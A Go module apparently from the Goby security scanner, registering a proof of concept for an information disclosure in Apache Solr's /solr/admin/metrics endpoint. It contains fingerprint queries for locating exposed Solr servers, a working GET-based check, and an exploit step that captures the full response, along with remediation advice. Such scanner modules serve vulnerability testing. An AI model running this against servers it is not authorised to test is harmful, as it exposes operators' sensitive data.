package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "APACHE-Solr /solr/admin/metrics Information Disclosure Vulnerability",
    "Description": "<p>Apache Solr is a powerful open source search platform that provides powerful full-text, distributed and web-oriented search capabilities for indexing and retrieving large-scale data. Attackers can construct special URLs to read sensitive information.</p>",
    "Product": "APACHE-Solr",
    "Homepage": "http://lucene.apache.org/solr/",
    "DisclosureDate": "2024-05-31",
    "PostTime": "2024-06-03",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "title=\"Solr Admin\" || body=\"SolrCore Initialization Failures\" || body=\"app_config.solr_path\" || banner=\"/solr/\" || header=\"/solr/\"",
    "GobyQuery": "title=\"Solr Admin\" || body=\"SolrCore Initialization Failures\" || body=\"app_config.solr_path\" || banner=\"/solr/\" || header=\"/solr/\"",
    "Level": "0",
    "Impact": "<p>Attackers can construct special URLs to read sensitive information.</p>",
    "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability: <a href=\"http://lucene.apache.org/solr/\">http://lucene.apache.org/solr/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls. </p><p>3. Keep the system off the public web if it is not necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/solr/admin/metrics",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "responseHeader",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/solr/admin/metrics",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/solr/admin/metrics"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/solr/admin/metrics",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "responseHeader",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "3.0",
    "Translation": {
        "CN": {
            "Name": "APACHE-Solr /solr/admin/metrics 信息泄露漏洞",
            "Product": "APACHE-Solr",
            "Description": "<p>Apache Solr是一个强大开源搜索平台，它提供了强大的全文搜索、分布式搜索和面向网络的搜索功能，适用于大规模数据的索引和检索。攻击者通过构造特殊URL地址， 读取系统敏感信息。<br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"http://lucene.apache.org/solr/ \" target=\"_blank\">http://lucene.apache.org/solr/&nbsp;</a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;&nbsp;&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者通过构造特殊URL地址， 读取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "APACHE-Solr /solr/admin/metrics Information Disclosure Vulnerability",
            "Product": "APACHE-Solr",
            "Description": "<p>Apache Solr is a powerful open source search platform that provides powerful full-text, distributed and web-oriented search capabilities for indexing and retrieving large-scale data. Attackers can construct special URLs to read sensitive information.<br></p>",
            "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability:&nbsp;<a href=\"http://lucene.apache.org/solr/\" target=\"_blank\">http://lucene.apache.org/solr/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.&nbsp;</p><p>3. Keep the system off the public web if it is not necessary.<br></p>",
            "Impact": "<p>Attackers can construct special URLs to read sensitive information.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "ExpParams": [
        {
            "name": "Info",
            "type": "select",
            "value": "Info",
            "show": ""
        }
    ],
    "PocId": "10959"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}